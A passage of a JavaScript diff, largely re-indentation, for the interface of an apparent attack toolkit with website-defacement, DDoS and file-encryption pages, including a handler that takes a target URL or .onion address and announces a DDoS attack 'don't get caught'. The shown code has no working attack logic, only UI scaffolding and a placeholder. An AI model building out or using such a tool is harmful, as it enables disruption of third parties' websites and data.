+    defaceLink.style.cssText = `
     color: white;
     text-decoration: none;
     padding: 10px;
   `;
-  navbar.appendChild(defaceLink);
+    navbar.appendChild(defaceLink);
 
-  const ddosLink = document.createElement('a');
-  ddosLink.textContent = 'DDoS Tool';
-  ddosLink.href = "/ddos";
-  ddosLink.style.cssText = `
+    const ddosLink = document.createElement('a');
+    ddosLink.textContent = 'DDoS Tool';
+    ddosLink.href = "/ddos";
+    ddosLink.style.cssText = `
     color: white;
     text-decoration: none;
     padding: 10px;
   `;
-  navbar.appendChild(ddosLink);
+    navbar.appendChild(ddosLink);
 
-  const encryptLink = document.createElement('a');
-  encryptLink.textContent = 'File Encryption Tool';
-  encryptLink.href = "/encryption";
-  encryptLink.style.cssText = `
+    const encryptLink = document.createElement('a');
+    encryptLink.textContent = 'File Encryption Tool';
+    encryptLink.href = "/encryption";
+    encryptLink.style.cssText = `
     color: white;
     text-decoration: none;
     padding: 10px;
   `;
-  navbar.appendChild(encryptLink);
+    navbar.appendChild(encryptLink);
 }
 
 addNavbarLinks();
 
 // Add Backup button to the Navbar
 function addBackupButtonNavbar() {
-  const navbar = document.querySelector('nav');
+    const navbar = document.querySelector('nav');
 
-  const backupButtonNav = document.createElement('button');
-  backupButtonNav.textContent = 'Backup Website';
-  backupButtonNav.style.cssText = `
+    const backupButtonNav = document.createElement('button');
+    backupButtonNav.textContent = 'Backup Website';
+    backupButtonNav.style.cssText = `
     padding: 10px;
     background-color: darkred;
     color: white;
     border: none;
     cursor: pointer;
   `;
-  backupButtonNav.addEventListener('click', () => {
-    const targetURL = document.getElementById("targetURL").value;
-    if (!targetURL) {
-      alert("ENTER A TARGET URL, YA MORON!");
-      logAction("User failed to enter target URL for backup.");
-      return;
-    }
-    backupWebsite(targetURL);
-  });
-  navbar.appendChild(backupButtonNav);
+    backupButtonNav.addEventListener('click', () => {
+        const targetURL = document.getElementById("targetURL").value;
+        if (!targetURL) {
+            alert("ENTER A TARGET URL, YA MORON!");
+            logAction("User failed to enter target URL for backup.");
+            return;
+        }
+        backupWebsite(targetURL);
+    });
+    navbar.appendChild(backupButtonNav);
 }
 
 addBackupButtonNavbar();
 
 // Add Restore button to the Navbar
 function addRestoreButtonNavbar() {
-  const navbar = document.querySelector('nav');
+    const navbar = document.querySelector('nav');
 
-  const restoreButtonNav = document.createElement('button');
-  restoreButtonNav.textContent = 'Restore Website';
-  restoreButtonNav.style.cssText = `
+    const restoreButtonNav = document.createElement('button');
+    restoreButtonNav.textContent = 'Restore Website';
+    restoreButtonNav.style.cssText = `
     padding: 10px;
     background-color: darkred;
     color: white;
     border: none;
     cursor: pointer;
   `;
-  restoreButtonNav.addEventListener('click', () => {
-    const targetURL = document.getElementById("targetURL").value;
-    if (!targetURL) {
-      alert("ENTER A TARGET URL, YA MORON!");
-      logAction("User failed to enter target URL for restoration.");
-      return;
-    }
-    restoreWebsite(targetURL);
-  });
-  navbar.appendChild(restoreButtonNav);
+    restoreButtonNav.addEventListener('click', () => {
+        const targetURL = document.getElementById("targetURL").value;
+        if (!targetURL) {
+            alert("ENTER A TARGET URL, YA MORON!");
+            logAction("User failed to enter target URL for restoration.");
+            return;
+        }
+        restoreWebsite(targetURL);
+    });
+    navbar.appendChild(restoreButtonNav);
 }
 
 addRestoreButtonNavbar();
 
 // Function to add DDoS to .onion functionality
 function addOnionSupport() {
-  const ddosButtonNav = document.querySelector('nav button:nth-child(3)'); // Select the DDoS button in the navbar
-  if (ddosButtonNav) {
-    ddosButtonNav.addEventListener('click', () => {
-      const targetURL = prompt("Enter the target URL (or .onion address), dipshit:");
-      if (targetURL) {
-        // Add your DDoS function call here
-        alert(`DDoS attack initiated on ${targetURL}. Good luck, have fun, don't get caught!`);
-        logAction(`DDoS attack initiated on ${targetURL}`);
+    const ddosButtonNav = document.querySelector('nav button:nth-child(3)'); // Select the DDoS button in the navbar
+    if (ddosButtonNav) {
+        ddosButtonNav.addEventListener('click', () => {
+            const targetURL = prompt("Enter the target URL (or .onion address), dipshit:");
+            if (targetURL) {
+                // Add your DDoS function call here
+                alert(`DDoS attack initiated on ${targetURL}. Good luck, have fun, don't get caught!`);
+                logAction(`DDoS attack initiated on ${targetURL}`);
 
-        // Redirect to DDoS tool page with target URL
-        window.location.href = `/ddos?targetURL=${encodeURIComponent(targetURL)}`;
+                // Redirect to DDoS tool page with target URL
+                window.location.href = `/ddos?targetURL=${encodeURIComponent(targetURL)}`;
 
-      } else {
-        alert("ENTER A TARGET URL, YA MORON!");
-        logAction("User failed to enter target URL for DDoS.");
-      }
-    });
-  }
+            } else {
+                alert("ENTER A TARGET URL, YA MORON!");
+                logAction("User failed to enter target URL for DDoS.");
+            }
+        });
+    }
 }
 
 addOnionSupport();
 
 // Function to enhance logging
 function enhanceLogging() {
-  console.log = (function (originalLog) {
-    return function (message) {
-      originalLog.apply(console, arguments);
-      logAction(`Console: ${message}`);
-    };
-  })(console.log);
+    console.log = (function (originalLog) {
+        return function (message) {
+            originalLog.apply(console, arguments);
+            logAction(`Console: ${message}`);
+        };
+    })(console.log);
 
-  console.error = (function (originalError) {
-    return function (message) {
-      originalError.apply(console, arguments);
-      logAction(`Error: ${message}`);
-    };
-  })(console.error);
+    console.error = (function (originalError) {
+        return function (message) {
+            originalError.apply(console, arguments);
+            logAction(`Error: ${message}`);
+        };
+    })(console.error);
 }
 
 enhanceLogging();
 
 // Improved error handling
 window.onerror = function (message, source, lineno, colno, error) {
-  console.error('An error occurred: ', message, source, lineno, colno, error);
-  alert(`An error occurred: ${message}. Check the console, DIPSHIT.`);
-  logAction(`Global error: ${message} at line ${lineno}`);
+    console.error('An error occurred: ', message, source, lineno, colno, error);
+    alert(`An error occurred: ${message}. Check the console, DIPSHIT.`);
+    logAction(`Global error: ${message} at line ${lineno}`);
 };
 
 // Add CSS styles for better appearance
 function addStyles() {
-  const style = document.createElement('style');
-  style.innerHTML = `
+    const style = document.createElement('style');
+    style.innerHTML = `
     body {
       font-family: monospace;
     }
@@ -891,7 +891,7 @@ function addStyles() {
       background-color: red;
     }
   `;
-  document.head.appendChild(style);
+    document.head.appendChild(style);
 }
 
 addStyles();
